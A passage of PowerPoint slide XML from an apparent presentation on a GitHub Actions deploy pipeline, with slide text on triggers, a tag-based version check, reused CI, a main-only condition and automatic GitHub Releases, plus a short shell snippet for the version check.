        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="5340096"/>
            <a:ext cx="237744" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6739128" y="5175504"/>
            <a:ext cx="4846320" cy="64008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400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Summary on the run page</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Totals and every non-Passed package, without downloading</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Deploy: manual or on version bump</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a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Same reusable CI, a main-only check, then an automatic GitHub Release</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Deploy Trigger"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1554480"/>
            <a:ext cx="2011680" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7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5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1252728" y="1737360"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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6" name="Icon 6" descr="Tag"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1397569" y="1882201"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2423160"/>
            <a:ext cx="2011680" cy="3657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500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Trigger</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658368" y="2816352"/>
            <a:ext cx="1792224" cy="8229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300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Version bump on main</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>or Run workflow button</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="9" name="Connector 9"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2587752" y="2628900"/>
            <a:ext cx="201168" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Deploy Version check"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2816352" y="1554480"/>
            <a:ext cx="2011680" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7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1" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3520440" y="1737360"/>
            <a:ext cx="603504" cy="603504"/>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2" name="Icon 12" descr="Search"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3665281" y="1882201"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2816352" y="2423160"/>
            <a:ext cx="2011680" cy="3657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500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Version check</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2926080" y="2816352"/>
            <a:ext cx="1792224" cy="8229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300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ts-app-v1.0.1 tagged?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Yes: skip · No: deploy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="15" name="Connector 15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4855464" y="2628900"/>
            <a:ext cx="201168" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Deploy CI (reused)"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5084064" y="1554480"/>
            <a:ext cx="2011680" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7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7" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5788152" y="1737360"/>
            <a:ext cx="603504" cy="603504"/>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8" name="Icon 18" descr="ListChecks"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5932993" y="1882201"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5084064" y="2423160"/>
            <a:ext cx="2011680" cy="3657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500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CI (reused)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5193792" y="2816352"/>
            <a:ext cx="1792224" cy="8229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300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>uses: $/…/ts-ci.yml</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Every CI gate + build</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="21" name="Connector 21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7123176" y="2628900"/>
            <a:ext cx="201168" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Deploy Approval"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7351776" y="1554480"/>
            <a:ext cx="2011680" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7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3" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8055864" y="1737360"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F06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24" name="Icon 24" descr="Hand"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8200705" y="1882201"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7351776" y="2423160"/>
            <a:ext cx="2011680" cy="3657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500" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Main only</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7461504" y="2816352"/>
            <a:ext cx="1792224" cy="8229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300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>if: github.ref ==</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'refs/heads/main'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="27" name="Connector 27"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9390888" y="2628900"/>
            <a:ext cx="201168" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Deploy Release"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9619488" y="1554480"/>
            <a:ext cx="2011680" cy="2148840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7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29" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10323576" y="1737360"/>
            <a:ext cx="603504" cy="603504"/>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30" name="Icon 30" descr="Rocket"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10468417" y="1882201"/>
            <a:ext cx="313822" cy="313822"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9619488" y="2423160"/>
            <a:ext cx="2011680" cy="3657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1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Release</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9729216" y="2816352"/>
            <a:ext cx="1792224" cy="82296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300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Build .tgz / .jar</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GitHub Release + notes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="How to deploy"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3931920"/>
            <a:ext cx="5120640" cy="1847088"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6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34" name="Text 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4041648"/>
            <a:ext cx="4754880" cy="169164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1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>How to deploy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Automatic: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>bump </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>version</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t> in package.json or pom.xml, merge the PR</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Manual: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Actions → TS Deploy → Run workflow</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>One deploy at a time: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>concurrency</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, never cancelled</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5897880" y="3931920"/>
            <a:ext cx="5742432" cy="1847088"/>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400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Version check (ts-deploy.yml)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>version=$(node -p </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"require('./ts-app/package.json').version"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>tag=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"ts-app-v${version}"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>if gh api </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"repos/$GITHUB_REPOSITORY/git/ref/tags/$tag"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>; then</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  should_deploy=false   </a:t>
            </a:r>
            <a:r>
